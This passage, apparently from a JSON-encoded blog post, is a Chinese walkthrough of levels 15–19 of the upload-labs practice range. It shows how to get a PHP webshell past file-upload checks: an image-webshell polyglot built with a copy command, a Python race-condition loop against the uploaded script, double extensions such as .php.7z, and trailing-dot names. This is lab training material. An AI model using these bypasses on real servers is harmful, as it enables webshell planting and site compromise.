扩展库</p>\n<p><img src=\"upload-labs-15-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-15-03.png\" alt=\"\"></p>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结</h2>\n<p>exif_imagetype ( string $filename ) : int <em>exif_imagetype()</em> 读取一个图像的第一个字节并检查其签名。</p>\n<h1 id=\"pass-16\"><a class=\"markdownIt-Anchor\" href=\"#pass-16\">#</a> Pass-16</h1>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程</h2>\n<p>看源码，判断了后缀，然后利用 imagecreatefrompng () 等函数创建图片，同时也利用这个函数判断图片类型是否一致了，然后再重命名文件</p>\n<p>依然用图片马绕过，但是简单的在文件前加入 GIF89a 已经不可</p>\n<p>那就把图片和木马合在一起叭，cmd 执行以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy pig.jpg/b +  a.php/a haha.jpg</span><br></pre></td></tr></table></figure>\n<p>再上传 haha.jpg</p>\n<p><img src=\"upload-labs-16-01.png\" alt=\"\"></p>\n<p>往下翻可以看到木马被插在了图片的中间</p>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结</h2>\n<p>过过过</p>\n<h1 id=\"pass-17\"><a class=\"markdownIt-Anchor\" href=\"#pass-17\">#</a> Pass-17</h1>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程</h2>\n<p>看源码，是先上传文件移动到 upload 文件夹后，再对后缀进行判断，判断允许后重命名文件再删除原来的文件，否则直接删除文件</p>\n<p>那就搞文件竞争，在上传文件和删除文件之间的时间，进行访问上传的文件，并且通过上传的文件创建新的木马</p>\n<p>利用 py 脚本不断访问上传的 haha.php</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requestswhile <span class=\"literal\">True</span>:    requests.get(<span class=\"string\">&#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://xn--request-fy3l308svi7bxjr.py\">然后运行 request.py</a></p>\n<p>然后不断点击发包</p>\n<p><img src=\"upload-labs-17-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-17-01.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-17-03.png\" alt=\"\"></p>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结</h2>\n<p>抄作业的感觉，唉</p>\n<h1 id=\"pass-18\"><a class=\"markdownIt-Anchor\" href=\"#pass-18\">#</a> Pass-18</h1>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程</h2>\n<p>源代码中，先检查了后缀，大小等等，再上传，再重命名</p>\n<p>它检查后缀用的白名单，所以试一下截断➕竞争</p>\n<p>想法很美好，现实很骨感，看报错信息，是卡在文件名后缀上了</p>\n<p><img src=\"upload-labs-18-01.png\" alt=\"\"></p>\n<p>所以直接和之前一样上传图片马哈哈哈</p>\n<p><img src=\"upload-labs-18-02.png\" alt=\"\"></p>\n<p>再用文件包含之类的配合…</p>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结</h2>\n<p>世上无难事只要肯放弃</p>\n<p>值得注意的是这里也可以将 php 文件后缀名更改为.php.7z，因为白名单中允许上传.7z 的文件，但是 apache 又不能解析这个格式，所以会把该文件当 php 的格式解析</p>\n<h1 id=\"pass-19\"><a class=\"markdownIt-Anchor\" href=\"#pass-19\">#</a> Pass-19</h1>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程</h2>\n<p>可以自定义名称</p>\n<p>上传 a.php</p>\n<p>自定义名称 haha.php.</p>\n<p>因为用的黑名单，上传成功</p>\n<p><img src=\"upload-labs-19-01.png\" alt=\"\"></p>\n<p>大小写都能绕哈哈哈</p>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结</h2>\n<p>哈哈哈</p>\n",
            "tags": [
                "文件上传靶场"
            ]
        }
    ]
}